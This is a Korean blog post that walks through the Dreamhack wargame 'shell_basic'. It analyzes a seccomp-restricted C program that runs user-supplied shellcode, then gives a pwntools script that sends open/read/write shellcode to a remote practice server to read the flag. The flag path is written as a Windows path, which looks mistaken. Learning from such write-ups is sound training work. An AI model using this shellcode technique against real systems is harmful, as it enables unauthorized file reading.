---
layout: single
title:  "Wargame : shell_basic"
categories: 정보보안
tag: [python, pwn, hacking]
toc: true
author_profile: true
---

<head>
  <style>
    table.dataframe {
      white-space: normal;
      width: 100%;
      height: 240px;
      display: block;
      overflow: auto;
      font-family: Arial, sans-serif;
      font-size: 0.9rem;
      line-height: 20px;
      text-align: center;
      border: 0px !important;
    }

    table.dataframe th {
      text-align: center;
      font-weight: bold;
      padding: 8px;
    }

    table.dataframe td {
      text-align: center;
      padding: 8px;
    }

    table.dataframe tr:hover {
      background: #b8d1f3; 
    }

    .output_prompt {
      overflow: auto;
      font-size: 0.9rem;
      line-height: 1.45;
      border-radius: 0.3rem;
      -webkit-overflow-scrolling: touch;
      padding: 0.8rem;
      margin-top: 0;
      margin-bottom: 15px;
      font: 1rem Consolas, "Liberation Mono", Menlo, Courier, monospace;
      color: $code-text-color;
      border: solid 1px $border-color;
      border-radius: 0.3rem;
      word-break: normal;
      white-space: pre;
    }

  .dataframe tbody tr th:only-of-type {
      vertical-align: middle;
  }

  .dataframe tbody tr th {
      vertical-align: top;
  }

  .dataframe thead th {
      text-align: center !important;
      padding: 8px;
  }

  .page__content p {
      margin: 0 0 0px !important;
  }

  .page__content p > strong {
    font-size: 0.8rem !important;
  }

  </style>
</head>


### C 코드 분석


```c

#include <fcntl.h>

#include <seccomp.h>

#include <stdio.h>

#include <stdlib.h>

#include <string.h>

#include <sys/prctl.h>

#include <unistd.h>

#include <sys/mman.h>

#include <signal.h>



void alarm_handler() {

    puts("TIME OUT");

    exit(-1);

}



void init() {

    setvbuf(stdin, NULL, _IONBF, 0);

    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);

    alarm(10);

}



void banned_execve() {

  scmp_filter_ctx ctx;

  ctx = seccomp_init(SCMP_ACT_ALLOW);

  if (ctx == NULL) {

    exit(0);

  }

  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);

  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execveat), 0);



  seccomp_load(ctx);

}



void main(int argc, char *argv[]) {

  char *shellcode = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);   

  void (*sc)();

  

  init();

  

  banned_execve();



  printf("shellcode: ");

  read(0, shellcode, 0x1000);



  sc = (void *)shellcode;

  sc();

}

```


#### init() 함수 분석


입출력 버퍼를 비활성화 및 시간 초과를 검사한다.



위에서 정의하였던 alarm_handler()함수를 이용하여 10초 타이머를 설정한다.


#### banned_execve() 함수 분석


seccomp 필터 초기화 후, execve()함수와 execveat()함수를 차단하는 규칙을 지정한다.


#### main() 함수 분석


mmap함수로, 메모리를 할당한 다음, 사용자로부터 쉘 코드를 입력받아 할당된 메모리에 저장한다.



여기서 쉘 코드는 포인터로 변환되어 호출된다.



banned_execve()함수에서 execve()함수와 execveat()함수를 차단하였기 때문에 일반적인 경로와 인자를 지정하여 프로그램을 실행할 수 없다.


### pwn 코드 작성


```python

from pwn import *



p = remote('host3.dreamhack.games', 18037)

# 원격 서버를 대상으로 익스플로잇을 진행 → remote() 함수 사욛



context.arch = 'amd64'

# 익스플로잇 대상 아키텍쳐는 amd64



payload = ''

payload += shellcraft.open('C:/Users/dst78/Downloads/shell_basic/flag_name_is_loooooong')

payload += shellcraft.read('rax', 'rsp', 100)

payload += shellcraft.write(1, 'rsp', 100)

# 페이로드를 문제에서 지정한 경로로 지정

# 스켈레톤 코드는 open, read, write 순서이므로 해당 순서를 따라 코드 작성

# 파일의 위치는 문제에서 지정하였으므로 바로 open

# read 함수는 rax에 저장된 정보를 통해 syscall을 수행, rsp스택의 시작주소 기입, 크기는 상관 x

# write 또한 마찬가지로 작성



p.sendline(asm(payload))

p.interactive()

```

![image.png](/image/shell_basic_shellcode.png)

